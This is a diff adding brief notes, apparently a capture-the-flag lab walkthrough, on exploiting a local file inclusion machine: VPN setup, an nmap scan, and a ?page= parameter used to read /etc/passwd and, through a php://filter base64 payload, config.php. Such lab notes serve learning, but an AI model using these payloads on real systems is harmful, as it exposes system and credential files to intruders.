@@ -1,0 +1,11 @@
+LFI (Local File Inclusion) machine
+1.conect with openvpn to vpn of ctf-red
+2.on other console put code ifconfig and verify vpn tun0
+3.see ping IP-machine
+4.later nmap -sS -sV -sC -p- IP -vvv -oN name_scanneo
+5.getting port 80 open, I saw message in inspection browser a first FLAG
+6.open windows about and articles and I saw vulnerabily ?page=
+7.with vulnerabily after, review inject code how for example /etc/passwd
+8.also, ?page=php://filter/convert.base64-encode/resource=config.php and 
+ETSCTF.html and /admin/ETSCTF.html
+
